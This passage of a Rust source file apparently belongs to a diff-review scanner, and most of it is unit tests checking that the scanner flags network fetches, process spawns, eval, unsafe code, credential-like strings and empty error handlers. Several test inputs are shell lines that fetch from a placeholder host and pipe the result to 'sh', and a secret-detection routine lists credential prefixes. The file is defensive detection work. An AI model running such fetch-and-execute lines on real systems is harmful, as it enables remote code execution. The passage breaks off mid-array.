/// the tables gives its match's rung ([`Match::basis`]), and the reader of a Rust hunk's tokens
/// gives both, `lexical` for a construct on one line and `hunk` for one over several. For the
/// vocabulary's `basis` of a code-evidence signal, so it cannot disagree with an item
/// (integrated review of 0.9.0, VI1-L-2 and CI3).
pub(crate) fn signal_bases(signal: EvidenceSignal) -> &'static [&'static str] {
    const LEXICAL: &str = Basis::Lexical.label();
    const HUNK: &str = Basis::Hunk.label();
    let read = rust_tokens::reads(signal, false) || rust_tokens::reads(signal, true);
    let on = |basis: Basis| {
        read || RULES
            .iter()
            .chain(RELEASED_RULES)
            .any(|r| r.signal == signal && r.matches.basis() == basis)
    };
    match (on(Basis::Lexical), on(Basis::Hunk)) {
        (true, true) => &[LEXICAL, HUNK],
        (true, false) => &[LEXICAL],
        (false, true) => &[HUNK],
        (false, false) => &[],
    }
}

/// The sides of a hunk on which some rule looks for `signal`: added lines ([`Side::New`]),
/// removed lines ([`Side::Old`]), or both, in that order. Read from the rule tables (today's
/// and that of release 0.8.4) and from the reader of a Rust hunk's tokens, which looks for
/// the Rust forms of eight signals and has no row in a table, so the vocabulary document
/// cannot disagree with the scanner.
#[must_use]
pub fn signal_sides(signal: EvidenceSignal) -> Vec<Side> {
    [Side::New, Side::Old]
        .into_iter()
        .filter(|side| {
            RULES
                .iter()
                .chain(RELEASED_RULES)
                .any(|r| r.signal == signal && r.side == *side)
                || rust_tokens::reads(signal, *side == Side::Old)
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::lexical::{ScanState, code_view, code_views};
    use crate::unplaced::unplaced;
    use deep_diff_forge_patch::parse;
    use std::fmt::Write as _;

    /// One file whose single hunk keeps a context line `x` and adds (`+`) or removes (`-`)
    /// `lines` after it.
    fn changed(path: &str, sign: char, lines: &[&str]) -> ReviewFile {
        let n = lines.len() + 1;
        let header = if sign == '+' {
            format!("@@ -1,1 +1,{n} @@")
        } else {
            format!("@@ -1,{n} +1,1 @@")
        };
        let mut text = format!("--- a/{path}\n+++ b/{path}\n{header}\n x\n");
        for line in lines {
            text.push(sign);
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    fn added(path: &str, lines: &[&str]) -> ReviewFile {
        changed(path, '+', lines)
    }

    fn removed(path: &str, lines: &[&str]) -> ReviewFile {
        changed(path, '-', lines)
    }

    fn signals(file: &ReviewFile) -> Vec<EvidenceSignal> {
        file_evidence(file).iter().map(|e| e.signal).collect()
    }

    /// A path and the line a rule's token would appear on in that language.
    fn sample_path(scope: Scope) -> &'static str {
        match scope {
            Scope::Languages(languages) => match languages[0] {
                Language::Rust => "src/x.rs",
                Language::Python => "x.py",
                Language::JavaScript => "x.ts",
                Language::Go => "x.go",
                Language::Shell => "x.sh",
                Language::Yaml => "x.yml",
            },
            Scope::Any => "notes.txt",
            Scope::CiWorkflow => ".github/workflows/ci.yml",
            Scope::BuildScript => "build.rs",
            Scope::PackageJson => "package.json",
        }
    }

    fn sample_token(token: &str) -> String {
        match token.strip_suffix('*') {
            Some(prefix) => format!("{prefix}_case()"),
            None => format!("{token} x"),
        }
    }

    /// N8: every token in the table has a case that finds it, on the side the rule reads.
    #[test]
    fn every_token_in_the_table_is_found() {
        for rule in RULES {
            if let Match::Imports(modules) = rule.matches {
                for module in modules {
                    let line = format!("const m = require(\"{module}\");");
                    let file = added(sample_path(rule.scope), &[&line]);
                    assert!(signals(&file).contains(&rule.signal), "{module}");
                }
            }
            let Match::Tokens(tokens) = rule.matches else {
                continue;
            };
            for token in tokens {
                let path = sample_path(rule.scope);
                let line = sample_token(token);
                let file = match rule.side {
                    Side::New => added(path, &[&line]),
                    Side::Old => removed(path, &[&line]),
                };
                assert!(
                    signals(&file).contains(&rule.signal),
                    "{} not found for {token:?} in {path}",
                    rule.signal.label()
                );
            }
        }
    }

    /// The same tokens in a comment or a string are not code.
    #[test]
    fn a_token_in_a_comment_or_string_is_not_code() {
        for (path, lines) in [
            (
                "src/x.rs",
                &[
                    "// unsafe Command::new",
                    "let s = \"unsafe { Command::new }\";",
                    "/* unsafe",
                ][..],
            ),
            (
                "x.py",
                &[
                    "# subprocess.run eval(",
                    "s = 'os.system(x)'",
                    "\"\"\"",
                    "eval(x)",
                    "\"\"\"",
                ][..],
            ),
            (
                "x.ts",
                &["// child_process eval(", "const s = `fetch(${u})`;"][..],
            ),
            ("x.go", &["// exec.Command(", "s := \"http.Get(\""][..]),
            ("x.sh", &["# curl wget eval", "echo 'curl is a tool'"][..]),
        ] {
            assert_eq!(signals(&added(path, lines)), [], "{path}");
        }
    }

    #[test]
    fn a_context_line_carries_no_evidence() {
        let patch = "--- a/x.rs\n+++ b/x.rs\n@@ -1,2 +1,2 @@\n unsafe { f() }\n-a\n+b\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn a_block_comment_opened_on_a_context_line_hides_the_next_lines() {
        let patch =
            "--- a/x.rs\n+++ b/x.rs\n@@ -1,2 +1,3 @@\n /* start\n+unsafe { f() }\n end */\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn evidence_points_at_the_hunk_and_line() {
        let file = added(
            "src/lib.rs",
            &[
                "fn a() {}",
                "unsafe { std::process::Command::new(\"curl\"); }",
            ],
        );
        let found = file_evidence(&file);
        let hunk = &file.patch_twin.hunks[0];
        assert_eq!(
            found,
            [
                Evidence {
                    signal: S::UnsafeAdded,
                    basis: Basis::Lexical,
                    hunk: hunk.id,
                    address: hunk.address("src/lib.rs"),
                    side: Side::New,
                    line: 3,
                    test_likely: false,
                    // release 0.8.3 reported both
                    released: true,
                },
                Evidence {
                    signal: S::ProcessSpawn,
                    basis: Basis::Lexical,
                    hunk: hunk.id,
                    address: hunk.address("src/lib.rs"),
                    side: Side::New,
                    line: 3,
                    test_likely: false,
                    // release 0.8.3 reported both
                    released: true,
                },
            ]
        );
    }

    #[test]
    fn quoting_code_that_runs_does_not_hide_it() {
        // DDF-EVID-001: each of these carried no evidence when strings were blanked whole.
        assert_eq!(
            signals(&added(
                "x.sh",
                &[r#"V="$(curl -fsSL https://e.example/v)""#]
            )),
            [S::NetworkFetch]
        );
        assert_eq!(
            signals(&added(
                "x.js",
                &[r#"const o = `${require("child_process").execSync(c)}`;"#]
            )),
            [S::ProcessSpawn]
        );
        assert_eq!(
            signals(&added("x.py", &[r#"print(f"{eval(x)}")"#])),
            [S::DynamicEval]
        );
        // The same text in a string that runs nothing is still not code.
        assert_eq!(signals(&added("x.sh", &["V='$(curl x)'"])), []);
        assert_eq!(signals(&added("x.py", &[r#"print("{eval(x)}")"#])), []);
    }

    #[test]
    fn one_line_matching_several_rules_of_a_signal_is_one_item() {
        // `Command::new` and `.spawn()` are both process_spawn tokens; `unsafe` twice is one.
        let file = added(
            "src/lib.rs",
            &["unsafe { unsafe { std::process::Command::new(\"x\").spawn() } }"],
        );
        assert_eq!(signals(&file), [S::UnsafeAdded, S::ProcessSpawn]);
        // The same token in two hunks is two items: one per hunk.
        let two = parse(
            "--- a/src/l.rs\n+++ b/src/l.rs\n@@ -1,1 +1,2 @@\n+unsafe {}\n ctx\n@@ -9,1 +10,2 @@\n+unsafe {}\n ctx\n",
        )
        .unwrap()
        .remove(0);
        let found = file_evidence(&two);
        assert_eq!(found.len(), 2);
        assert_ne!(found[0].hunk, found[1].hunk);
    }

    /// The PR 5 review's inputs (workflow `wf_b39e1c70-545`): an interpolation is scanned as
    /// code with its own strings, escapes and comments, so a closer in a nested string, after a
    /// backslash, in a comment or ending a `case` pattern neither hides the code after it nor
    /// exposes the outer string's text.
    #[test]
    fn an_interpolation_is_scanned_as_code_with_its_own_strings() {
        let hidden_before: [(&str, &str, EvidenceSignal); 12] = [
            ("a.sh", r#"V="$(echo ')' ; curl x)""#, S::NetworkFetch),
            ("a.sh", r#"V="$(echo \) ; curl x)""#, S::NetworkFetch),
            (
                "a.sh",
                r#"V="$(case a in a) curl x;; esac)""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"X="$(tr -d ')' < f | curl https://e.example/x)""#,
                S::NetworkFetch,
            ),
            ("a.sh", r#"V="$(echo "$(curl x)")""#, S::NetworkFetch),
            (
                "a.js",
                r#"const o = `${ "}" + require("child_process").execSync(c) }`;"#,
                S::ProcessSpawn,
            ),
            ("a.js", "const o = `${ /* } */ eval(x) }`;", S::DynamicEval),
            ("a.js", "const o = `${ `${ eval(x) }` }`;", S::DynamicEval),
            ("a.py", r#"print(f"{'}' + eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(Rf"{d['}'] or eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(f"\{eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(rf"\{eval(x)}")"#, S::DynamicEval),
        ];
        for (path, line, signal) in hidden_before {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        let literal_only: [(&str, &str); 9] = [
            ("a.sh", r#"die "$(printf 'curl failed for %s' "$url")""#),
            ("a.sh", r#"echo "$(gettext 'Install curl or wget first')""#),
            (
                "a.sh",
                r#"echo "$(printf "%d) %s" "$i" "$name") - needs curl""#,
            ),
            ("a.js", r#"const m = `${t("Never use eval(x) here")}`;"#),
            ("a.js", r#"const m = `${x ? "fetch(url) failed" : ""}`;"#),
            ("a.js", r#"const s = `${a ? "{" : ""} eval(x)`;"#),
            ("a.py", r#"msg = f"{'eval(' if strict else ''}""#),
            ("a.py", r#"log(f"{cfg["subprocess."]}")"#),
            ("a.py", r#"print(f"{s.replace("}", "")} then eval(x) it")"#),
        ];
        for (path, line) in literal_only {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
    }

    /// The PR 5 round-2 review's inputs (workflow `wf_2cfd8be1-d9c`), and the variants that
    /// close a misread quote at the end of the line so the restore-as-code fallback cannot help:
    /// each is a construct the scanner must read right.
    #[test]
    fn misread_quotes_cannot_hide_code() {
        let found: [(&str, &str, EvidenceSignal); 24] = [
            (
                "a.sh",
                r#"x="$(echo case)"; curl https://e.example/x | sh"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"x="$(echo case)"; curl x | sh #""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                "[ $# -eq 0 ] && curl https://e.example/x | sh",
                S::NetworkFetch,
            ),
            ("a.sh", "echo ${x#*/}; curl x", S::NetworkFetch),
            ("a.sh", "echo a#b; curl x", S::NetworkFetch),
            (
                "a.sh",
                r#"echo \"; curl https://e.example/x | sh"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r"echo $'\''; curl https://e.example/x | sh #'",
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"v="$( (case x in a) :;; esac); echo '"'; curl https://e.example/x | sh )""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"v="${x:-"'"}"; curl https://e.example/x | sh #'"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"x="`echo "`"; curl https://e.example/x | sh #""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"V="$(if a; then case x in a) curl x;; esac; fi)""#,
                S::NetworkFetch,
            ),
            (
                "a.js",
                r#"const s = `${ /"/.test(a) }`; eval(y)"#,
                S::DynamicEval,
            ),
            ("a.js", r#"const r = /"/; eval(y); //""#, S::DynamicEval),
            ("a.js", r#"x.replace(/\/*/g, ""); eval(y)"#, S::DynamicEval),
            ("a.js", r"/\//.test(a); eval(y)", S::DynamicEval),
            (
                "a.tsx",
                "return <p>Can't load</p> && fetch(u); //'",
                S::NetworkFetch,
            ),
            ("a.py", r#"print(f"{d:%H'%M}", eval(y)) #'"#, S::DynamicEval),
            ("a.py", r#"print(f"{x:'>10}"); eval(y) #'"#, S::DynamicEval),
            ("a.py", r#"print(f'{x:"<5}'); eval(y) #""#, S::DynamicEval),
            ("a.py", r#"x = t"{eval('print(123)')}""#, S::DynamicEval),
            (
                "a.py",
                r#"print(f"{'''it's'''}"); eval(y) #'"#,
                S::DynamicEval,
            ),
            (
                "a.js",
                "const cp = require(`child_process`);",
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r#"const cp = require( "child_process" );"#,
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r#"import{exec}from"child_process";import "node:child_process";"#,
                S::ProcessSpawn,
            ),
        ];
        for (path, line, signal) in found {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        let literal_only: [(&str, &str); 12] = [
            (
                "a.sh",
                r#"echo "Matches: $(grep --ignore-case -c todo notes.txt) (fetch more with curl)""#,
            ),
            ("a.sh", r#"echo "Mode: $(echo $case) - install curl first""#),
            ("a.js", r#"// const cp = require("child_process");"#),
            (
                "a.js",
                r#"throw new Error("Do not require('child_process') in the browser bundle");"#,
            ),
            (
                "a.js",
                r#"const help = `Use ${cmd} or require("child_process") yourself`;"#,
            ),
            ("a.js", "const re = /from 'child_process'/;"),
            (
                "a.ts",
                r#"import type { ChildProcess } from "node:child_process";"#,
            ),
            ("a.ts", "export type { SpawnOptions } from 'child_process';"),
            ("a.ts", r#"type Cp = typeof import("node:child_process");"#),
            (
                "a.js",
                r#"const m = `${s.match(/^{/) ? "obj" : "arr"} - see fetch(url) docs`;"#,
            ),
            ("a.py", r#"print(f"{x:'^5}", 'eval(y)')"#),
            ("a.py", r#"print(f"{d[a:b]!r:>{w}} then eval(x) it")"#),
        ];
        for (path, line) in literal_only {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
        // A JSDoc example inside a block comment is not an import.
        let doc = added(
            "a.js",
            &[
                "/**",
                " * @example import { exec } from 'node:child_process';",
                " */",
            ],
        );
        assert_eq!(signals(&doc), []);
    }

    /// The PR 5 round-3 review's inputs (workflow `wf_fdfaa98c-6b0`) that real code can contain:
    /// shell `case` in every command position, `esac` as a pattern word, nested arms, JS regexes
    /// after operators and keywords, quotes after keywords, and the import forms.
    #[test]
    fn shell_case_js_regex_and_import_forms_are_read_right() {
        let fetch = "curl https://e.example/x | sh";
        for line in [
            format!(r#"V="$(if case a in a) true;; esac; then :; fi; {fetch})""#),
            format!(r#"V="$(while case a in b) true;; esac; do break; done; {fetch})""#),
            format!(r#"V="$(! case a in b) true;; esac; {fetch})""#),
            format!(r#"V="$(time case a in b) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in b|esac) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) case b in b) :;; esac;; c) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) :; esac=1;; b) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) echo ${{esac}};; b) :;; esac; {fetch})""#),
            format!("echo $(date)#; {fetch}"),
        ] {
            assert_eq!(
                signals(&added("a.sh", &[&line])),
                [S::NetworkFetch],
                "{line}"
            );
        }
        for line in [
            "x = a + /'/.source; eval(y) //'",
            "x = typeof' ' ; eval(y) //'",
            r#"function f(){return"//"+eval(x)}"#,
            "x = a++ / 2; eval(y); z = b / 3",
        ] {
            assert_eq!(signals(&added("a.js", &[line])), [S::DynamicEval], "{line}");
        }
        // A quote after `return` opens a string, so its `/*` is not a comment that hides the
        // next line.
        let next = added("a.js", &[r#"function f(){return"/*"}"#, "eval(x)"]);
        assert_eq!(signals(&next), [S::DynamicEval]);
        for (path, line) in [
            ("a.js", "const cp = require(\t\"child_process\");"),
            ("a.js", r#"const cp = module.require("child_process");"#),
            ("a.js", r#"const cp = require(("child_process"));"#),
            (
                "a.ts",
                r#"export type T = 1; const cp = require("child_process");"#,
            ),
            ("a.js", r#"const o = { m: import("child_process") };"#),
            // A type annotation loads nothing, but it is counted: the rule errs toward evidence.
            (
                "a.ts",
                r#"let p: import("child_process").ChildProcess | undefined;"#,
            ),
        ] {
            assert_eq!(signals(&added(path, &[line])), [S::ProcessSpawn], "{line}");
        }
        for line in [
            r#"echo "Ran: $(basename ${case}) - fetch the logs with curl""#,
            r#"echo "$(case $1 in (a) echo x;; esac) - install curl first""#,
        ] {
            assert_eq!(signals(&added("a.sh", &[line])), [], "{line}");
        }
    }

    /// The final PR 5 review's regressions against main (workflow `wf_bbb5e9f1-254`): common
    /// code the branch misread, and lines that made the import rule quadratic.
    #[test]
    fn common_typescript_continuations_and_raw_strings_keep_their_evidence() {
        for (path, line, signal) in [
            (
                "n.ts",
                "const pct = (stats.get(key)! / total) * 100; const res = await fetch(`/api/stats/${key}`);",
                S::NetworkFetch,
            ),
            (
                "n.ts",
                r#"const ms = timings[name]! / 1000; void fetch("/log", { method: "POST" });"#,
                S::NetworkFetch,
            ),
            (
                "n.ts",
                "const pct = done! / total; const out = execSync(`du -sh ${dir}/`);",
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r"const run = cmd => /^'/.test(cmd) ? null : execSync(cmd, { shell: '/bin/sh' });",
                S::ProcessSpawn,
            ),
            (
                "src/a.rs",
                r#"let root = Path::new(r"C:\"); let out = Command::new("cmd").output()?;"#,
                S::ProcessSpawn,
            ),
            (
                "src/a.rs",
                r##"let s = r#"a "quoted" \"#; unsafe { f() }"##,
                S::UnsafeAdded,
            ),
            (
                "src/a.rs",
                r#"let b = br"\"; unsafe { f() }"#,
                S::UnsafeAdded,
            ),
        ] {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        // A line that continues an expression with `/` divides; one after `=` opens a regex.
        let divided = added(
            "m3.js",
            &[
                "const elapsed = (Date.now() - start)",
                "  / 1000; fetch(`/api/timing/${elapsed}`);",
            ],
        );
        assert_eq!(signals(&divided), [S::NetworkFetch]);
        let regex = added("m3.js", &["const re =", "  /fetch(/; const x = 1;"]);
        assert_eq!(signals(&regex), []);
        // A raw string's text is still text, and an ordinary string still escapes.
        assert_eq!(signals(&added("src/a.rs", &[r#"let s = r"unsafe";"#])), []);
        assert_eq!(signals(&added("src/a.rs", &[r#"let s = "\"unsafe";"#])), []);
    }

    #[test]
    fn the_import_rule_is_linear_on_long_lines() {
        within_deadline(|| {
            let start = ScanClock::start();
            for unit in [
                "Array.from(x),",
                "from ",
                "require ",
                "import ",
                "require(require(",
            ] {
                let line = unit.repeat(200_000);
                assert_eq!(signals(&added("a.js", &[&line])), [], "{unit}");
            }
            let spaced = format!(";{}from 'child_process'", " ".repeat(200_000));
            assert_eq!(signals(&added("a.js", &[&spaced])), [S::ProcessSpawn]);
            // Linear scans of these lines took about 2 s in a debug build; the quadratic import
            // rule of eee2b4c^ took about 66 s.
            let spent = start.elapsed();
            assert!(
                spent < std::time::Duration::from_secs(15),
                "the long lines took {spent:?} of {}",
                start.kind
            );
        });
    }

    /// A line that is one word of 200,000 bytes ranks in under a second of the thread's CPU
    /// time, each on its own: a JavaScript and a TypeScript word (FINDING-5: the released
    /// scanner walked back over the word at each of its bytes, 18 s in v0.8.3 and twice that
    /// with the readings of 0.9.0), and the credential prefixes that repeat inside their own
    /// run, which the secret rule walked to the run's end at each repeat; and lines of 200,000
    /// bytes of `catch` heads, whose handler or binding each `catch` read to the end of the
    /// line (the empty-handler rule until 2026-11-18). The long-line tests hold every trigger.
    #[test]
    fn one_long_word_ranks_in_under_a_second() {
        within_deadline(|| {
            for (path, line) in [
                ("src/a.js", "a".repeat(200_000)),
                ("src/a.ts", "a".repeat(200_000)),
                ("notes.txt", format!("x{}", "AKIA".repeat(50_000))),
                ("notes.txt", format!("x{}", "xoxb-a".repeat(33_334))),
                ("src/a.js", "x.catch((".repeat(22_223)),
                ("src/a.ts", "catch(".repeat(33_334)),
                ("src/a.ts", "catch (".repeat(28_572)),
            ] {
                // A blank line of context on each side, as Git writes it (0.10.0: the parser refuses a
                // hunk with no context past line 1; was `@@ -2,0 +3,1 @@`).
                let patch = format!("--- a/{path}\n+++ b/{path}\n@@ -2,2 +2,3 @@\n \n+{line}\n \n");
                let files = parse(&patch).unwrap();
                let start = ScanClock::start();
                let ranked = crate::rank(&files);
                let spent = start.elapsed();
                assert_eq!(ranked.len(), 1);
                assert!(
                    spent < std::time::Duration::from_secs(1),
                    "{path}: a line of {} bytes ranked in {spent:?} of {}",
                    line.len(),
                    start.kind
                );
            }
        });
    }

    /// The scanner with the bounded keyword test finds what the released walk found, with the
    /// same labels on the same lines (FINDING-5; the released reading is the floor): 1,500
    /// generated JavaScript and TypeScript hunks and creations in two hunks, each ranked and
    /// read for its whole evidence once each way.
    #[test]
    fn the_bounded_keyword_reading_finds_what_the_released_one_finds() {
        let lines =
            crate::lexical::released_word_walk::hostile_lines(0x5EED_F1D5_0000_0007, 4500, 300);
        let (mut asked, mut found) = (0, 0);
        for (case, three) in lines.chunks(3).enumerate() {
            let name = if case % 2 == 0 {
                "src/a.js"
            } else {
                "src/a.ts"
            };
            let mut patch = format!("--- a/{name}\n+++ b/{name}\n@@ -2,0 +3,3 @@\n");
            if case % 3 == 2 {
                patch = format!("--- /dev/null\n+++ b/{name}\n@@ -0,0 +1,2 @@\n");
            }
            for (at, line) in three.iter().enumerate() {
                if case % 3 == 2 && at == 2 {
                    patch.push_str("@@ -2,0 +3,1 @@\n");
                }
                writeln!(patch, "+{line}").unwrap();
            }
            let read = || {
                let files = unplaced(&patch);
                let items: Vec<(S, Side, u32, bool)> = file_evidence(&files[0])
                    .iter()
                    .map(|e| (e.signal, e.side, e.line, e.released))
                    .collect();
                (items, crate::rank(&files))
            };
            let (new, new_ranked) = read();
            let ((old, old_ranked), calls) = crate::lexical::released_word_walk::run(read);
            asked += calls;
            found += old.len();
            for item in &old {
                assert!(
                    new.contains(item),
                    "the bounded reading lost {item:?}:\n{patch}"
                );
            }
            assert_eq!(new, old, "{patch}");
            assert_eq!(new_ranked, old_ranked, "{patch}");
        }
        assert!(
            asked > 10_000,
            "the released reading answered {asked} times"
        );
        assert!(found > 200, "{found} items found by the released reading");
    }

    /// The secret rule reads at most the bytes of a run its length test needs, and answers as
    /// the walk to the run's end did: 20,000 generated lines of credential prefixes, runs of
    /// their bytes and breaks between them, each compared with the rule of release 0.8.3.
    #[test]
    fn the_bounded_secret_reading_is_the_released_one() {
        /// [`looks_like_secret`] as release 0.8.3 had it.
        fn released(text: &str) -> bool {
            if text.contains("-----BEGIN") && text.contains("PRIVATE KEY") {
                return true;
            }
            let tail = |prefix: &str, min: usize, ok: fn(u8) -> bool| {
                text.match_indices(prefix).any(|(i, _)| {
                    let before = i.checked_sub(1).map(|j| text.as_bytes()[j]);
                    let boundary = before.is_none_or(|b| !b.is_ascii_alphanumeric());
                    let run = text.as_bytes()[i + prefix.len()..]
                        .iter()
                        .take_while(|b| ok(**b))
                        .count();
                    boundary && run >= min
                })
            };
            let upper_digit = |b: u8| b.is_ascii_uppercase() || b.is_ascii_digit();
            let alnum = |b: u8| b.is_ascii_alphanumeric();
            let slack = |b: u8| b.is_ascii_alphanumeric() || b == b'-';
            tail("AKIA", 16, upper_digit)
                || ["ghp_", "gho_", "ghs_", "ghu_", "ghr_"]
                    .iter()
                    .any(|p| tail(p, 36, alnum))
                || ["xoxb-", "xoxp-", "xoxa-", "xoxr-"]
                    .iter()
                    .any(|p| tail(p, 10, slack))
                || tail("sk_live_", 16, alnum)
        }
        const ATOMS: [&str; 16] = [
            "AKIA",
            "ghp_",
            "ghr_",
            "xoxb-",
            "xoxr-",
            "sk_live_",
            "A",
            "a",
            "7",
            "-",
            "_",
            " ",
            "x",
            "-----BEGIN",
            "PRIVATE KEY",
            "é",
        ];
        let mut seed = 0x5EED_F1D5_0000_0008_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let mut yes = 0;
        for _ in 0..20_000 {
            let mut line = String::new();
            for _ in 0..=next(12) {
                let atom = ATOMS[next(ATOMS.len())];
                line.push_str(&atom.repeat(1 + next(3) * next(20)));
            }
            assert_eq!(looks_like_secret(&line), released(&line), "{line:?}");
            yes += usize::from(released(&line));
        }
        assert!(
            (2_000..18_000).contains(&yes),
            "{yes} of 20,000 lines look like secrets"
        );
    }

    // The empty-handler rule as it was before 2026-11-18 (`empty_handler`, `empty_callback`,
    // `after_closing` of `3f6ae0cd`, renamed): the reference the one-pass reading is held to.
    /// Whether `code` (a line's code view) opens an error handler that does nothing, given the code
    /// of the line after it on the same side (`None` when the hunk ends there).
    ///
    /// - Python: `except …:` whose body is `pass` or `...`, on the same line or the next.
    /// - JS and TS: `catch`, with or without a binding, whose block is empty: `{}` on the line, `{`
    ///   ending the line and `}` starting the next, or the whole empty block on the next line. Also
    ///   a promise's `.catch(…)` whose handler is a function with an empty body, on one line.
    /// - Go: `if err != nil {`, with or without a statement before the test, closed at once, on the
    ///   line or the next.
    ///
    /// A handler whose body the hunk does not show is not evidence: the next line must be there.
    fn released_empty_handler(language: Language, code: &str, next: Option<&str>) -> bool {
        let line = code.trim();
        let next = next.map(str::trim);
        let nothing = |body: &str| matches!(body, "pass" | "...");
        // The block after `head` is empty: `{}` here, or `{` here and `}` first on the next line.
        let empty_block = |after: &str| {
            let after = after.trim();
            let closed_here = after
                .strip_prefix('{')
                .is_some_and(|rest| rest.trim_start().starts_with('}'));
            let block_on_next_line = after.is_empty()
                && next.is_some_and(|n| {
                    n.strip_prefix('{')
                        .is_some_and(|rest| rest.trim_start().starts_with('}'))
                });
            closed_here
                || (after == "{" && next.is_some_and(|n| n.starts_with('}')))
                || block_on_next_line
        };
        match language {
            Language::Python => {
                let Some(rest) = line.strip_prefix("except") else {
                    return false;
                };
                if rest.as_bytes().first().is_some_and(|b| is_ident(*b)) {
                    return false;
                }
                let Some((_, body)) = rest.rsplit_once(':') else {
                    return false;
                };
                let body = body.trim();
                nothing(body) || (body.is_empty() && next.is_some_and(nothing))
            }
            Language::JavaScript => line.match_indices("catch").any(|(at, word)| {
                // A promise's `.catch(…)` swallows when its handler is a function with an empty body.
                if at > 0 && line.as_bytes()[at - 1] == b'.' {
                    return released_empty_callback(&line[at + word.len()..]);
                }
                let before_ok = at == 0 || !is_boundary_blocker(line.as_bytes()[at - 1]);
                let after = line[at + word.len()..].trim_start();
                if !before_ok || after.as_bytes().first().is_some_and(|b| is_ident(*b)) {
                    return false;
                }
                // An optional binding in parentheses, then the block.
                let after = match after.strip_prefix('(') {
                    Some(binding) => match binding.split_once(')') {
                        Some((_, block)) => block,
                        None => return false,
                    },
                    None => after,
                };
                empty_block(after)
            }),
            // `if err != nil {` and `if err := f(); err != nil {`: the test comes last in the head.
            Language::Go => line.strip_prefix("if ").is_some_and(|head| {
                head.rsplit_once("err != nil")
                    .is_some_and(|(_, after)| empty_block(after))
            }),
            Language::Rust | Language::Shell | Language::Yaml => false,
        }
    }

    /// Whether `after` (what follows `.catch` on a line of code) is a call whose argument is a
    /// function with an empty body: `(() => {})`, `(e => {})`, `(async (e) => { })`,
    /// `(function () {})`. Anything else, including a handler that names a function, is not.
    fn released_empty_callback(after: &str) -> bool {
        let Some(inner) = after.trim_start().strip_prefix('(') else {
            return false;
        };
        let inner = inner.trim_start();
        let inner = inner.strip_prefix("async ").unwrap_or(inner).trim_start();
        let body = if let Some(rest) = inner.strip_prefix("function") {
            // An optional name, then the parameters.
            let rest = rest.trim_start();
            let name = rest.bytes().take_while(|b| is_ident(*b)).count();
            let Some(rest) = rest
                .get(name..)
                .and_then(|rest| released_after_closing(rest.trim_start(), b'(', b')'))
            else {
                return false;
            };
            rest
        } else {
            let after_parameters = if inner.starts_with('(') {
                released_after_closing(inner, b'(', b')')
            } else {
                inner.get(inner.bytes().take_while(|b| is_ident(*b)).count()..)
            };
            let Some(rest) = after_parameters.and_then(|rest| rest.trim_start().strip_prefix("=>"))
            else {
                return false;
            };
            rest
        };
        body.trim_start()
            .strip_prefix('{')
            .and_then(|rest| rest.trim_start().strip_prefix('}'))
            .is_some_and(|rest| rest.trim_start().starts_with(')'))
    }

    /// What follows the `close` that matches the `open` that `text` starts with, nesting counted:
    /// for `(a = f(), b) => {}` and parentheses, ` => {}`. `None` when `text` does not start with
    /// `open` or it is never closed. `text` is a code view, so a delimiter in a string is blank.
    /// Before, the first `)` ended the parameters, and a default value that calls a function hid an
    /// empty handler (review V3 round 2, VD3R2-L-1).
    fn released_after_closing(text: &str, open: u8, close: u8) -> Option<&str> {
        if text.as_bytes().first() != Some(&open) {
            return None;
        }
        let mut depth = 0usize;
        for (at, byte) in text.bytes().enumerate() {
            if byte == open {
                depth += 1;
            } else if byte == close {
                depth -= 1;
                if depth == 0 {
                    return text.get(at + 1..);
                }
            }
        }
        None
    }

    /// The empty-handler rule reads what follows a closer once for a line and answers as it did
    /// when each `catch` walked to the end of the line: 60,000 generated lines, with a next
    /// line or none, in each language the rule reads, compared with the rule as it was. Half
    /// are atoms in any order (`catch`, `.catch`, brackets, arrows, bindings, blocks); half are
    /// a handler's head, binding or callback and block, between atoms, so that many are empty
    /// handlers and many nearly are.
    #[test]
    fn the_one_pass_handler_reading_is_the_released_one() {
        const ATOMS: [&str; 24] = [
            "catch",
            ".catch",
            "catch ",
            "(",
            ")",
            "{",
            "}",
            " ",
            "=>",
            "async ",
            "function",
            "function f",
            "e",
            "x",
            ",",
            "f()",
            "a = f(",
            ";",
            "(e) => {}",
            "() => {}",
            "{}",
            "except",
            ": pass",
            "if err != nil ",
        ];
        const HEADS: [&str; 8] = [
            "catch",
            "} catch",
            "x.catch",
            "p.then(f).catch",
            "except",
            "except E",
            "if err != nil",
            "if e := f(); err != nil",
        ];
        const MIDDLES: [&str; 14] = [
            "",
            " ",
            "(e)",
            " (e) ",
            "(",
            "((",
            "(() => ",
            "((e) => ",
            "(function () ",
            "(async (e) => ",
            "(e => ",
            "(function f(a = g()) ",
            "((a = f(), b) => ",
            ":",
        ];
        const TAILS: [&str; 10] = [
            "{}", " { }", "{", "", "})", "{})", "{ })", "{}) ", ")", " pass",
